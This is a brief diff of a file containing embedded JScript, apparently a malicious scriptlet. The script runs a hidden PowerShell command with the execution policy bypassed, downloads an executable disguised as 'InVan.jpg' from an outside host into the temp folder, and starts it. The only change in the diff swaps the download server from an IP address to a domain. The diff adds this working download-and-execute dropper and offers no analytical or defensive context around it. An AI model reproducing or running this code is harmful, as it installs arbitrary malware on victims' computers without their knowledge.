@@ -13,7 +13,7 @@
 <script language="JScript">
 <![CDATA[
 
-	var r = new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -nop -w hidden -c (new-object System.Net.WebClient).DownloadFile(\'http://220.167.105.8:19998/InVan.jpg\',\'%temp%\\InVan.exe\');start-process \'%temp%\\InVan.exe\';", 0, true);
+	var r = new ActiveXObject("WScript.Shell").Run("powershell -ExecutionPolicy Bypass -nop -w hidden -c (new-object System.Net.WebClient).DownloadFile(\'http://daili.agx88.com/image/InVan.jpg\',\'%temp%\\InVan.exe\');start-process \'%temp%\\InVan.exe\';", 0, true);
 ]]>
 </script>
 
